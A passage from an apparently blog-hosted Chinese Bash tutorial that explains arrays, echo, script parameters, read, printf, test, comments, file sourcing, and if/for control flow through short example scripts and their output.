<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义数组的一般形式为：</span></span><br><span class="line">array_name=(value0 value1 value2 value3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br><span class="line"><span class="comment">#采用键值对的形式赋值（了解即可）</span></span><br><span class="line">array=([1]=one [2]=two [3]=three)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或单独定义数组的各个分量（麻烦，不推荐）</span></span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure>
<h4 id="读取数组">读取数组</h4>
<p>读取数组元素值的一般格式是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B <span class="string">&quot;C&quot;</span> D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个元素为: <span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个元素为: <span class="variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个元素为: <span class="variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第四个元素为: <span class="variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本，输出结果如下所示：</span></span><br><span class="line">第一个元素为: A</span><br><span class="line">第二个元素为: B</span><br><span class="line">第三个元素为: C</span><br><span class="line">第四个元素为: D</span><br></pre></td></tr></table></figure>
<p>使用 <code>@</code>或<code>*</code> 符号可以获取数组中的所有元素，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B C D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><br><span class="line">my_array[4]=E</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本，输出结果如下所示：</span></span><br><span class="line">数组的元素为: A B C D</span><br><span class="line">数组的元素为: A B C D E</span><br></pre></td></tr></table></figure>
<h4 id="获取数组的长度">获取数组的长度</h4>
<p>获取数组长度的方法与获取字符串长度的方法相同，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取得数组元素的个数</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></span><br><span class="line"><span class="comment"># 取得数组单个元素的长度</span></span><br><span class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B C D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本，输出结果如下所示：</span></span><br><span class="line">数组元素个数为: 4</span><br><span class="line">数组元素个数为: 4</span><br></pre></td></tr></table></figure>
<h4 id="数组元素信息删除">数组元素信息删除</h4>
<p>使用unset命令删除数组信息：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[<span class="number">17</span>:<span class="number">38</span>:<span class="number">49</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># my_array=(A B C D)</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">53</span>:<span class="number">00</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;</span></span><br><span class="line">A B C D</span><br><span class="line">[<span class="number">17</span>:<span class="number">54</span>:<span class="number">25</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># unset my_array[3]</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">01</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;</span></span><br><span class="line">A B C</span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">27</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># unset my_array </span></span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">33</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;  #输出为空</span></span><br></pre></td></tr></table></figure>
<h2 id="Shell基础操作">Shell基础操作</h2>
<h3 id="echo命令">echo命令</h3>
<p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。命令格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> string</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示普通字符串:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span>       <span class="comment">#这里的双引号完全可以省略，以下命令与上面实例效果一致：</span></span><br><span class="line"><span class="built_in">echo</span> It is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示转义字符:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;It is a test\&quot;&quot;</span>   <span class="comment">#结果:&quot;It is a test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> \&quot;It is a <span class="built_in">test</span>\&quot;     <span class="comment">#同样，双引号也可以省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 开启转义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;It is \n a test\c&quot;</span></span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">[15:38:16 root@rocky95 ~]# sh 1.sh </span><br><span class="line">It is a <span class="built_in">test</span></span><br><span class="line">It is </span><br><span class="line"> a <span class="built_in">test</span>[15:38:19 root@rocky95 ~]# </span><br></pre></td></tr></table></figure>
<h3 id="Shell传递参数">Shell传递参数</h3>
<p>shell变量除了可以直接赋值外，还可以使用脚本传参和read命令从标准输入中获得，read为bash内置命令;</p>
<h4 id="调用脚本时传入参数">调用脚本时传入参数</h4>
<p>执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh filename.sh var1 var2 ...... varn</span><br></pre></td></tr></table></figure>
<p><strong>n</strong> 代表一个数字，$1 为执行脚本的第一个参数，$2 为执行脚本的第二个参数，以此类推……</p>
<p><strong>$0</strong> 为执行的文件名</p>
<p>test.sh文件内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Shell 传递参数实例！&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行的文件名：<span class="variable">$0</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为：<span class="variable">$1</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为：<span class="variable">$2</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为：<span class="variable">$3</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">sh test.sh 1 2 3</span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure>
<p><font class="notice">注意：当”n“为多位时，脚本内变量需要用大括号“{}”包括，不然只能识别第一位</font></p>
<p>参数获取：</p>
<table>
<thead>
<tr>
<th>参数处理</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>$#</code></td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td><code>$!</code></td>
<td>后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>所有参数作为一个字符串传出</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>所有的参数一个一个传出来</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$1=&#x27;</span><span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$2=&#x27;</span><span class="variable">$2</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$10=&#x27;</span><span class="variable">$10</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$10=&#x27;</span><span class="variable">$&#123;10&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$$=&#x27;</span>$$</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$#=&#x27;</span><span class="variable">$#</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$@=&#x27;</span><span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$*=&#x27;</span>$*</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$?=&#x27;</span>$?</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行脚本，输出结果如下所示：</span></span><br><span class="line">sh 1.sh a b c d e f g h i j</span><br><span class="line"><span class="variable">$1</span>=a</span><br><span class="line"><span class="variable">$2</span>=b</span><br><span class="line"><span class="variable">$10</span>=a0</span><br><span class="line"><span class="variable">$10</span>=j</span><br><span class="line">$$=3636848</span><br><span class="line"><span class="variable">$#</span>=10</span><br><span class="line"><span class="variable">$@</span>=a b c d e f g h i j</span><br><span class="line">$*=a b c d e f g h i j</span><br><span class="line">$?=0</span><br></pre></td></tr></table></figure>
<p><code>$*</code>与<code>$@</code>的区别：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，，则<code>$*</code> 等价于 “1 2 3”（传递了一个参数），而<code>$@</code>等价于 “1” “2” “3”（传递了三个参数）。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$*\&quot; 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;$*&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$@\&quot; 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$* 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $*; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$@ 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本，输出结果如下所示：</span></span><br><span class="line">python@ubuntu:~/test$ sh <span class="built_in">test</span> 1 2 3</span><br><span class="line">-- <span class="string">&quot;$*&quot;</span> 演示 ---</span><br><span class="line">1 2 3</span><br><span class="line">-- <span class="string">&quot;<span class="variable">$@</span>&quot;</span> 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- $* 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- <span class="variable">$@</span> 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<h4 id="read-命令"><strong>read 命令</strong></h4>
<p>从标准输入中读取一行,并把输入行的每个字段的值指定给 shell 变量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># read</span></span><br><span class="line"><span class="built_in">read</span> var      <span class="comment">#交互式传参给var</span></span><br><span class="line">-p var	      <span class="comment">#设置交互过程相关提示信息 prompt</span></span><br><span class="line">-t var        <span class="comment">#设置交互过程等待时间信息 timeout</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You name is <span class="variable">$name</span>!&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请重新输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You name is <span class="variable">$name</span>!&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;这个输入只存在10s： &quot;</span> -t 10 name</span><br><span class="line"><span class="built_in">echo</span> 10s到了！！</span><br><span class="line"><span class="comment">#执行结果:</span></span><br><span class="line">[15:34:25 root@rocky95 ~]# sh test.sh</span><br><span class="line">Corazon                        <span class="comment">#标准输入</span></span><br><span class="line">You name is Corazon!           <span class="comment">#输出</span></span><br><span class="line">请重新输入你的名字：Corazon        <span class="comment">#设置交互过程相关提示信息</span></span><br><span class="line">You name is Corazon!           <span class="comment">#输出</span></span><br><span class="line">这个输入只存在10s： 10s到了！！     <span class="comment">#设置交互过程等待时间信息#输出 </span></span><br></pre></td></tr></table></figure>
<h3 id="printf-命令">printf 命令</h3>
<p>printf 命令可以实现标准化输出，printf 命令的语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>  format-string  [arguments...]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>format-string:</strong> 为格式控制字符串</p>
</li>
<li class="lvl-2">
<p><strong>arguments:</strong> 为参数列表。</p>
</li>
</ul>
<p>实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4s\n&quot;</span> 姓名 性别 体重kg  </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭靖 男 66.1234 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 杨过 男 48.6543 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭芙 女 47.9876 </span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本，输出结果如下所示：</span></span><br><span class="line">姓名     性别   体重kg</span><br><span class="line">郭靖     男      66.12</span><br><span class="line">杨过     男      48.65</span><br><span class="line">郭芙     女      47.99</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s %c %d %f都是格式替代符</p>
</li>
<li class="lvl-2">
<p>%-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。</p>
</li>
<li class="lvl-2">
<p>%-4.2f 指格式化为小数，其中.2指保留2位小数。</p>
</li>
</ul>
<p>printf的转义序列：</p>
<table>
<thead>
<tr>
<th>序列</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>\a</td>
<td>警告字符，通常为ASCII的BEL字符</td>
</tr>
<tr>
<td>\b</td>
<td>后退</td>
</tr>
<tr>
<td>\c</td>
<td>抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略</td>
</tr>
<tr>
<td>\f</td>
<td>换页（formfeed）</td>
</tr>
<tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\r</td>
<td>回车（Carriage return）</td>
</tr>
<tr>
<td>\t</td>
<td>水平制表符</td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>\</td>
<td>一个字面上的反斜杠字符</td>
</tr>
<tr>
<td>\ddd</td>
<td>表示1到3位数八进制值的字符。仅在格式字符串中有效</td>
</tr>
<tr>
<td>\0ddd</td>
<td>表示1到3位的八进制值字符</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%s&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A\nB&gt;</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%b&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A</span><br><span class="line">B&gt;</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;www.runoob.com \a&quot;</span></span><br><span class="line">www.runoob.com [14:11:29 root@centon7 ~]# </span><br></pre></td></tr></table></figure>
<h3 id="test命令">test命令</h3>
<p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p>
<p>实例演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 数值测试</span></span><br><span class="line">num1=10</span><br><span class="line">num2=5</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1 / num2] -eq $[num2-num1]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数相等！&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数不相等！&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line"><span class="comment">#两个数不相等！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#02 字符串测试</span></span><br><span class="line">num1=<span class="string">&quot;ru1noob&quot;</span></span><br><span class="line">num2=<span class="string">&quot;runoob&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$num1</span> = <span class="variable">$num2</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个字符串相等!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个字符串不相等!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line"><span class="comment">#两个字符串不相等!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件测试</span></span><br><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件已存在!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件不存在!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line"><span class="comment">#文件已存在!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#另外，Shell还提供了与( -a )、或( -o )、非( ! )三个逻辑操作符用于将测试条件连接起来，其优先级为：&quot;!“最高，”-a&quot;次之，&quot;-o&quot;最低。例如：</span></span><br><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./notFile -o -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;至少有一个文件存在!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个文件都不存在&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line"><span class="comment">#至少有一个文件存在!</span></span><br></pre></td></tr></table></figure>
<h3 id="Shell-注释">Shell 注释</h3>
<p>以 <strong>#</strong> 开头的行就是注释，会被解释器忽略：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment"># 这是一个注释</span></span><br><span class="line"><span class="comment"># author：Corazon</span></span><br><span class="line"><span class="comment"># site：www.mcorazon.top</span></span><br><span class="line"><span class="comment"># slogan：强者，绝非偶然！</span></span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment">### 用户配置区 开始 ###</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 这里可以添加脚本描述信息</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">### 用户配置区 结束  ###</span></span><br></pre></td></tr></table></figure>
<p>多行注释还可以使用以下格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>EOF 也可以使用其他符号:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
<h3 id="文件包含">文件包含</h3>
<p>Shell可以使用文件包含来调用变量和函数等。Shell 文件包含的语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. filename   <span class="comment"># 注意点号(.)和文件名中间有一空格</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">source</span> filename</span><br></pre></td></tr></table></figure>
<p><strong>实例</strong></p>
<p>创建两个 shell 脚本文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test1.sh 代码如下：</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#test2.sh 代码如下：</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#使用 . 号来引用test1.sh 文件</span></span><br><span class="line">. ./test1.sh</span><br><span class="line"><span class="comment"># 或者使用以下包含文件代码</span></span><br><span class="line"><span class="comment"># source ./test1.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;url地址：<span class="variable">$url</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>接下来，我们为 <a href="http://test2.sh">test2.sh</a> 添加可执行权限并执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test2.sh </span><br><span class="line">$ ./test2.sh </span><br><span class="line">url地址：http://www.baidu.com</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**注：**被包含的文件 <a href="http://test1.sh">test1.sh</a> 不需要可执行权限。</p>
</blockquote>
<h3 id="其他命令与变量">其他命令与变量</h3>
<p><strong>命令</strong></p>
<p>usleep --微秒</p>
<p>sleep --秒为单位</p>
<p>exit     退出整个脚本的运行（终止脚本继续运行）</p>
<p>unset  取消变量</p>
<p><strong>变量</strong></p>
<p>$random 随机数</p>
<h2 id="Shell-流程控制">Shell 流程控制</h2>
<p>通常，在bash的各种条件结构和流程控制结构中都要进行各种检验，然后根据检验结果执行不同的操作；</p>
<h3 id="if-else判断语句">if else判断语句</h3>
<p>if 语句语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [condition]:</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>在终端可以将命令写成一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">&quot;ssh&quot;</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;true&quot;</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else-if else 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else语句经常与test命令结合使用，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num1=$[2*3]</span><br><span class="line">num2=$[1+5]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1] -eq $[num2]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数字相等!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数字不相等!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">两个数字相等!</span><br></pre></td></tr></table></figure>
<h3 id="for循环">for循环</h3>
<p>for循环一般格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>C语言方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((exp1;exp2;exp3))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  command1</span><br><span class="line">  ......</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>写成一行（方便在终端执行）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN; <span class="keyword">do</span> command1; command2… <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
